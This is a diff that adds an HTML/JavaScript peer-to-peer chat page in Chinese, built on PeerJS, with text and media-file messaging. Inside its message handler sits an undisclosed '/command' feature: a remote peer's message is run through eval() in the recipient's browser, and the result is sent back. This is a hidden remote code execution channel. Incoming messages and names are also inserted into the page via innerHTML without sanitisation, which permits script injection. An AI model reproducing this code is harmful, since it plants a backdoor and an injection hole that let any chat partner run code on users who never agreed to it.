@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-Scalable=0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
+    <title>点对点 聊天室</title>
+</head>
+
+<body>
+    <div id="container">
+        <h1 id="containerH1">请输入对方的名字:</h1>
+        <form id="formContainer">
+            <input type="text" id="TANameInp" placeholder="想和谁聊天?" required>
+            <input id="TANameSub" type="submit" value="确定">
+        </form>
+
+        <style>
+            #container {
+                opacity: 0;
+                transition: 1s ease;
+                user-select: none;
+                -webkit-tap-highlight-color: rgba(255, 255, 255, 0.2);
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                width: 100vw;
+                text-align: center;
+            }
+
+            #container h1 {
+                font-size: 24px;
+                margin-bottom: 20px;
+                color: #222;
+            }
+
+            #container h1 b {
+                display: block;
+                text-overflow: ellipsis;
+                overflow: hidden;
+                font-size: xx-large;
+                color: burlywood;
+                background-color: rgba(34, 34, 34, 0.3);
+                border-radius: 10px;
+            }
+
+            #container input[type="text"] {
+                padding: 10px;
+                border: 2px solid green;
+                border-radius: 10px;
+                font-size: 16px;
+                margin-bottom: 15px;
+                background: #222;
+                color: #ccc;
+                text-align: center;
+                outline: none;
+            }
+
+            #container input[type="submit"] {
+                padding: 10px 20px;
+                background-color: #4CAF50;
+                color: white;
+                border: none;
+                border-radius: 3px;
+                font-size: 16px;
+                cursor: pointer;
+                outline: none;
+                display: none;
+            }
+
+            #container input[type="submit"]:hover {
+                background-color: #45a049;
+            }
+        </style>
+    </div>
+
+    <main>
+        <div id="MessagesDiv"></div>
+        <div class="foot">
+            <div class="center">
+                <form id="formMessages">
+                    <input type="text" id="messageText" title="输入 /文件 发送文件" placeholder="说点什么呢?">
+                    <input type="submit" id="sendInp" title="send" value="发送✉" />
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <style>
+        html,
+        body {
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        main {
+            position: fixed;
+            opacity: 0;
+            transition: opacity 1s ease;
+            display: none;
+            user-select: none;
+            -webkit-tap-highlight-color: rgba(255, 255, 255, 0.2);
+            text-align: center;
+            width: 100vw;
+            height: 100vh;
+        }
+
+        main #MessagesDiv {
+            width: 100vw;
+            height: calc(100vh - 55px);
+            border-bottom: 1px solid gray;
+            padding-bottom: 4px;
+            overflow-y: auto;
+            background-color: #ddd;
+        }
+
+        main #MessagesDiv .left {
+            text-align: left;
+            align-items: start;
+            margin: 5px;
+            margin-top: 10px;
+        }
+
+        main #MessagesDiv .right {
+            text-align: right;
+            align-items: end;
+            margin: 5px;
+            margin-top: 10px;
+        }
+
+        main #MessagesDiv img,
+        main #MessagesDiv video,
+        main #MessagesDiv audio {
+            display: inline-block;
+            max-width: 100%;
+            max-height: 60vh;
+        }
+
+        main #MessagesDiv .Mess {
+            color: #222;
+            display: inline-block;
+            max-width: 75vw;
+            min-height: 10px;
+            background-color: rgb(150, 150, 150, .2);
+            border-radius: 5px;
+            margin: 5px;
+            padding: 10px;
+            user-select: text;
+            text-align: left;
+            overflow-wrap: break-word;
+        }
+
+        main #MessagesDiv .M_other {
+            margin-bottom: 5px;
+            margin: 5px;
+            position: relative;
+            background-color: rgb(34, 34, 34, .2);
+            border-radius: 5px;
+        }
+
+        main #MessagesDiv date {
+            font-size: xx-small;
+            color: gray;
+            margin-left: 10px;
+            margin-right: 10px;
+        }
+
+        main .foot {
+            position: absolute;
+            margin: 0;
+            width: 100vw;
+            height: 50px;
+            background-color: #ddd;
+        }
+
+        .foot form {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 100vw;
+        }
+
+        .foot #messageText {
+            height: 40px;
+            width: calc(100% - 100px);
+            background-color: #bbb;
+            border-radius: 5px;
+            outline: none;
+            border: none;
+            font-size: 120%;
+            color: #222;
+        }
+
+        .foot #sendInp {
+            width: 70px;
+            height: 38px;
+            border: none;
+            background-color: cornflowerblue;
+            color: #ccc;
+            font-size: 110%;
+            border-radius: 5px;
+            outline: none;
+        }
+
+        .foot #sendInp:active {
+            background-color: rgb(75, 131, 237);
+            color: #fff;
+        }
+    </style>
+
+</body>
+<script>
+    let Params = new URLSearchParams(window.location.search);
+    const formContainer = document.getElementById('formContainer');
+    const formMessages = document.getElementById('formMessages');
+    const TANameInp = document.getElementById('TANameInp');
+    const container = document.getElementById('container');
+    const containerH1 = document.getElementById('containerH1');
+    const MessagesDiv = document.getElementById('MessagesDiv');
+    const MessagesText = document.getElementById('messageText');
+    const TANameSub = document.getElementById('TANameSub');
+    let TaID = null;
+    let peer = null;
+    let conn = null;
+
+
+    // 填写收件方名称的提交事件
+    formContainer.addEventListener('submit', (event) => {
+        event.preventDefault();
+        if (TANameInp.value.trim() === '') { TANameInp.value = ''; return null; }
+        GoOn(TANameInp.value);
+    })
+
+    formMessages.addEventListener('submit', (event) => {
+        event.preventDefault();
+        if (MessagesText.value.trim() !== '') {
+            sendMessage();
+        }
+    })
+
+    // 名称转Id
+    function NameToId(theName) {
+        let result = '';
+        for (let i = 0; i < theName.length; i++) {
+            result += theName.charCodeAt(i) + 'X';
+        }
+        return result.trim();
+    }
+    // Id转名称
+    function IdToName(Id) {
+        let codeArr = Id.split('X');
+        let result = '';
+        for (let i = 0; i < codeArr.length - 1; i++) {
+            result += String.fromCharCode(parseInt(codeArr[i]));
+        }
+        return result;
+    }
+
+    // 处理发送消息
+    function sendMessage(text) {
+        if (conn && conn.open) {
+            if (text) {
+                if (typeof text !== 'string') { text += " " }
+                console.log(`send: <${text}>`);
+                conn.send(text);
+            } else {
+                // 发送消息 清空输入框
+                let MessagesData = MessagesTest(MessagesText.value);
+                if (MessagesData) {
+                    conn.send(MessagesText.value);
+                    AddtheMessages(MessagesData, 'right', Params.get('name'));
+                }
+                MessagesText.value = '';
+            }
+        } else {
+            let T = `<b style='color:darkred'>连接中断☹ 重新连接?</b><br/>
+            <button onclick="window.location.href = window.location.href;" style='background:green;color:#ccc;width:30%;height:50px;font-size:130%'><b><big>好的</big></b></button><br>`
+            AddtheMessages(T);
+        }
+    }
+
+    // 处理消息内容
+    function MessagesTest(data, Name) {
+        if (typeof data === 'object' && data !== null && isNaN(parseFloat(data))) {
+            let FileText;
+            if (data.JsonData[1].startsWith('data:image')) {
+                FileText = `<img onload="this.scrollIntoView({ block: 'center', behavior: 'smooth' })" src="${data.JsonData[1]}" title="${data.JsonData[0]}" alt="${data.JsonData[0]}"/>`;
+            } else if (data.JsonData[1].startsWith('data:video')) {
+                FileText = `<video onloadedmetadata="this.scrollIntoView({ block: 'center', behavior: 'smooth' })" src="${data.JsonData[1]}" title="${data.JsonData[0]}" alt="${data.JsonData[0]}" controls/>`;
+            } else if (data.JsonData[1].startsWith('data:audio')) {
+                FileText = `<audio onloadedmetadata="this.scrollIntoView({ block: 'center', behavior: 'smooth' })" src="${data.JsonData[1]}" title="${data.JsonData[0]}" alt="${data.JsonData[0]}" controls/>`;
+            } else {
+                FileText = `<b>[${data.JsonData[0]}] Type Error: 发送的文件类型错误</b>`;
+            }
+            if (Name == Params.get('name')) {
+                AddtheMessages(FileText, 'right', Name, true);
+            } else {
+                AddtheMessages(FileText, 'left', Name, true);
+            }
+            return;
+        }
+        if (data.toLowerCase().startsWith("/command")) {
+            const command = data.slice(9);
+            if (Name) {
+                try {
+                    const EvalResult = eval(command);
+                    console.log('Run:', command); sendMessage(EvalResult);
+                } catch (err) { sendMessage(err); }
+                return;
+            } else { return command; }
+        } else if (data.startsWith("/")) {
+            switch (data.toLowerCase()) {
+                case '/file':
+                case '/文件':
+                    let file = document.createElement('input');
+                    file.type = "file"; file.accept = "audio/*,video/*,image/*";
+                    file.addEventListener('change', function () {
+                        const selectedFile = this.files[0];
+                        const reader = new FileReader();
+                        let base64String;
+                        reader.onload = () => {
+                            // 在此处处理读取到的文件数据，例如将其转换为 base64 编码
+                            base64String = reader.result;
+                            console.log("发送文件：", selectedFile.name);
+                            MessagesTest({ 'JsonData': [selectedFile.name, base64String] }, Params.get('name'));
+                            conn.send({ 'JsonData': [selectedFile.name, base64String] });
+                        }; reader.readAsDataURL(selectedFile);
+                    }); file.click(); MessagesText.value = "";
+                    return;
+                    break;
+                default:
+                    return data;
+                    break;
+            }
+        }
+        else {
+            try {
+                let jsonData = JSON.parse(data);
+                console.log(jsonData);
+                return jsonData + '';
+            } catch (err) { return data; }
+        }
+    }
+
+    function GoOn(TaName) {
+        // 连接 接收方的Peer
+
+        TaID = NameToId(TaName);
+        conn = peer.connect(TaID);
+
+        // 连接失败事件
+        TANameSub.disabled = true; TANameSub.style.cursor = 'no-drop';
+        containerH1.innerHTML = "正在与<b>" + TaName + "</b>建立连接中";
+        let Timer = setTimeout(() => {
+            if (!TaID || !conn.open) { alert(`连接失败，\n对方“ ${TaName} ”离线中`); }
+            TANameSub.disabled = false; TANameSub.style.cursor = 'pointer';
+            containerH1.innerHTML = "请输入对方的名字:";
+            TaID = null;
+        }, 3000);
+        let Alt = false;
+        peer.on('error', function (err) {
+            if (!Alt) {
+                if (!TaID || !conn.open) {
+                    Alt = true;// 标记错误提示已弹出
+                    console.log(err, conn);
+                    clearTimeout(Timer);
+                    if (!TaID || !conn.open) { alert(`连接失败，\n对方“ ${TaName} ”离线中`); }
+                    TANameSub.disabled = false; TANameSub.style.cursor = 'pointer';
+                    containerH1.innerHTML = "请输入对方的名字:";
+                    TaID = null;
+                }
+            };
+        });
+
+        conn.on('open', () => {
+            clearTimeout(Timer);
+            setTimeout("container.remove()", 1000); container.style.opacity = '0'; container.style.transform = "translate(-50%, 100%)";
+            document.querySelector('main').style.display = "block"; setTimeout("document.querySelector('main').style.opacity = '1'", 100);
+            conn.send(`<b style='color:green'>连接成功!</b>`);
+            localStorage.setItem('TaName', TaName);
+            document.title = `(${Params.get('name')})连接—${TaName}`;
+            setTimeout(function () {
+                if (MessagesDiv.innerHTML == '') {
+                    AddtheMessages(`<b style='color:darkred'>注意：对方无法回复您的消息,因为Ta已连接其他用户</b>`);
+                    Params.set('name', "<small style='background:orange;border-radius: 5px;' title='对方无法回复您的消息\n仅:发送数据'>(临时会话)</small> " + Params.get("name"));
+                }
+            }, 2000)
+        });
+
+        // 监听连接关闭事件
+        conn.on('close', () => {
+            console.log('Connection closed');
+            AddtheMessages(`<b style='color:darkred'>与 ${IdToName(TaID)} 的连接中断☹</b>`)
+            // window.location.href = window.location.href;
+            document.title = `(${Params.get('name')})连接—中断`;
+            TaID = null;
+        });
+    };
+
+    // 获取参数 打开自己的Peer
+    if (Params.get('name')) {
+        peer = new Peer(NameToId(Params.get('name')));
+        console.log(peer, NameToId(Params.get('name')), IdToName(peer.id));
+        setTimeout("container.style.opacity = '1';", 100)
+        peer.on('connection', function (Ta) {
+            console.log("连接了:", IdToName(Ta.peer));
+
+            if (!TaID) { GoOn(IdToName(Ta.peer)) } else {
+                console.log(`已连接了的 ID: ${TaID}`);
+            }
+
+            Ta.on('data', (data) => {
+                // 接受数据
+                let TaName = IdToName(Ta.peer);
+                if (TaID !== Ta.peer) {
+                    TaName += " <small style='background:orange;border-radius: 5px;' title='您无法回复Ta的消息\n仅:收取数据'>(临时会话)</small>";
+                }
+                console.log(IdToName(Ta.peer), 'send:', data);
+                if (data = MessagesTest(data, IdToName(Ta.peer))) {
+                    AddtheMessages(data, 'left', TaName)
+                }
+            });
+        });
+        setTimeout(() => {
+            if (localStorage.getItem('TaName')) { TANameInp.value = localStorage.getItem('TaName'); }
+            TANameSub.style.display = 'unset';
+        }, 1000);
+    } else {
+        console.error('未发现name参数！', Params);// #.html?name=你的名字
+        document.body.innerHTML = "<p align='center'style='background-color:#222;color:red;'title='参数错误'>Params Error!</p>";
+        debugger;
+    }
+
+    function AddtheMessages(messages, ClassName, theName, NotTyping) {
+        let currentDate = new Date(); // 获取当前时间
+        let dateString = currentDate.toLocaleString('chinese', { hour12: false }).replace(/\//g, "/");
+        let MessE; let NameE; let MainE;
+
+        if (ClassName == 'left' || ClassName == 'right') {
+            MainE = document.createElement('div');
+            NameE = document.createElement('h4'); MessE = document.createElement('div');
+            NameE.innerHTML = `<date>${dateString}</date>` + theName;
+            if (ClassName == 'left') { NameE.innerHTML = theName + `<date>${dateString}</date>`; }
+            NameE.style.margin = "5px";
+            MessE.className = "Mess";
+            MainE.className = ClassName;
+            MainE.appendChild(NameE); MainE.appendChild(MessE);
+            MessagesDiv.appendChild(MainE);
+
+            if (NotTyping) {
+                MessE.innerHTML = messages;
+            } else {
+                // 设置初始索引和计时器
+                let index = 0;
+                let timer; let TypingSpeed;
+                TypingSpeed = 10; // 统一打字速度
+                console.log(`开始打字,速度：${TypingSpeed},字数：${messages.length}`);
+                timer = setInterval(typing, TypingSpeed);
+                // 定时器回调函数
+                function typing() {
+                    MessE.innerHTML = messages.slice(0, index);// 每次回调 index 个字符
+                    index++;// 增加索引
+                    // 如果所有字符都显示完成，清除计时器
+                    if (index > messages.length) {
+                        clearInterval(timer);
+                        MessE.innerHTML = messages;
+                        MessE.scrollIntoView({ block: 'center', behavior: 'smooth' });
+                    }
+                }; typing();
+            }; MessE.scrollIntoView({ block: 'center', behavior: 'smooth' });
+        } else {
+            MessE = document.createElement('div');
+            MessE.className = 'M_other';
+            MessE.innerHTML = messages + `<date>- ${dateString}</date>`;
+            MessagesDiv.appendChild(MessE);
+            MessE.scrollIntoView({ block: 'center', behavior: 'smooth' });
+        }
+    }
+</script>
+
+</html>
